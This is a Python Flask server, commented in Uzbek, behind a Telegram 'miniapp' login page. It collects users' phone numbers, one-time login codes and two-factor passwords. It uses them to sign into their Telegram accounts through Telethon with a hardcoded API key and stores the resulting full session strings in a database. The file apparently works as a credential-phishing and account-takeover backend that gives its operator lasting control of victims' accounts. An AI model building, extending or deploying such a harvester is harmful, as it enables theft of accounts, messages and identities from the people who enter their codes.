import os
import asyncio
import re
from flask import Flask, request, jsonify, render_template

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    PhoneCodeInvalidError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
    FloodWaitError
)

from database import (
    save_login_attempt,
    get_login_attempt,
    delete_login_attempt,
    save_user,
    save_user_session
)

# =====================
# CONFIG
# =====================
API_ID = 25780325
API_HASH = "2c4cb6eee01a46dc648114813042c453"

# =====================
# ASYNC LOOP (BITTA!)
# =====================
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def run(coro):
    return loop.run_until_complete(coro)

# =====================
# FLASK APP — SHART!
# =====================
app = Flask(__name__, template_folder="templates")

# =====================
# INIT DB (FAQAT AGAR KERAK BO‘LSA)
# =====================
if os.getenv("RUN_INIT_DB") == "1":
    init_db()

# =====================
# ASYNC HELPER
# =====================
# HELPERS
# =====================
def clean_phone(phone: str) -> str:
    phone = re.sub(r"\D", "", phone)
    if not phone.startswith("998") or len(phone) != 12:
        raise ValueError("Telefon formati noto‘g‘ri")
    return "+" + phone

# =====================
# ROUTES
# =====================
@app.route("/")
def index():
    return "LOGIN SERVER WORKING"

@app.route("/miniapp")
def miniapp():
    return render_template("login.html")

# =====================
# SEND CODE
# =====================
@app.route("/send_code", methods=["POST"])
def send_code():
    data = request.json or {}
    phone_raw = data.get("phone")

    if not phone_raw:
        return jsonify({"status": "error"}), 400

    try:
        phone = clean_phone(phone_raw)

        # 🔑 AGAR OLDIN URINISH BO‘LSA — O‘SHA SESSIONNI OLAMIZ
        attempt = get_login_attempt(phone)
        session = (
            StringSession(attempt[1]) if attempt else StringSession()
        )

        async def _send_code():
            client = TelegramClient(session, API_ID, API_HASH)
            await client.connect()

            sent = await client.send_code_request(phone)
            print("SEND_CODE DEBUG:", sent)

            save_login_attempt(
                phone=phone,
                phone_code_hash=sent.phone_code_hash,
                session_string=client.session.save()
            )

            # ❗ test uchun vaqtincha o‘chiramiz

        run(_send_code())
        return jsonify({"status": "ok"}), 200

    except Exception as e:
        print("SEND_CODE ERROR:", repr(e))
        return jsonify({"status": "error"}), 500

# =====================
# VERIFY CODE
# =====================
@app.route("/verify_code", methods=["POST"])
def verify_code():
    data = request.json or {}
    phone_raw = data.get("phone")
    code = data.get("code")

    if not phone_raw or not code:
        return jsonify({"status": "error"}), 400

    try:
        phone = clean_phone(phone_raw)
        attempt = get_login_attempt(phone)

        if not attempt:
            return jsonify({
                "status": "error",
                "message": "Kod muddati o‘tgan"
            }), 400

        phone_code_hash, session_string = attempt

        async def _verify():
            client = TelegramClient(
                StringSession(session_string),
                API_ID,
                API_HASH
            )
            await client.connect()

            try:
                await client.sign_in(
                    phone=phone,
                    code=code,
                    phone_code_hash=phone_code_hash
                )
            except SessionPasswordNeededError:
                return None, client.session.save()

            user = await client.get_me()
            final_session = client.session.save()
            return user, final_session

        user, final_session = run(_verify())

        # ===== 2FA =====
        if user is None:
            return jsonify({"status": "2fa_required"}), 200

        save_user_session(user.id, final_session)
        save_user(user.id, phone, user.username)
        delete_login_attempt(phone)

        return jsonify({"status": "ok"}), 200

    except PhoneCodeInvalidError:
        return jsonify({
            "status": "error",
            "message": "Kod noto‘g‘ri"
        }), 400

    except Exception as e:
        print("VERIFY_CODE ERROR:", repr(e))
        return jsonify({"status": "error"}), 500

# =====================
# VERIFY PASSWORD (2FA)
# =====================
@app.route("/verify_password", methods=["POST"])
def verify_password():
    data = request.json or {}
    phone_raw = data.get("phone")
    password = data.get("password")

    if not phone_raw or not password:
        return jsonify({"status": "error"}), 400

    try:
        phone = clean_phone(phone_raw)
        attempt = get_login_attempt(phone)

        if not attempt:
            return jsonify({"status": "error"}), 400

        _, session_string = attempt

        async def _verify_password():
            client = TelegramClient(
                StringSession(session_string),
                API_ID,
                API_HASH
            )
            await client.connect()

            await client.sign_in(password=password)
            user = await client.get_me()
            final_session = client.session.save()
            return user, final_session

        user, final_session = run(_verify_password())

        save_user_session(user.id, final_session)
        save_user(user.id, phone, user.username)
        delete_login_attempt(phone)

        return jsonify({"status": "ok"}), 200

    except PasswordHashInvalidError:
        return jsonify({
            "status": "error",
            "message": "Parol noto‘g‘ri"
        }), 400

    except Exception as e:
        print("VERIFY_PASSWORD ERROR:", repr(e))
        return jsonify({"status": "error"}), 500

# =====================
# RUN
# =====================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
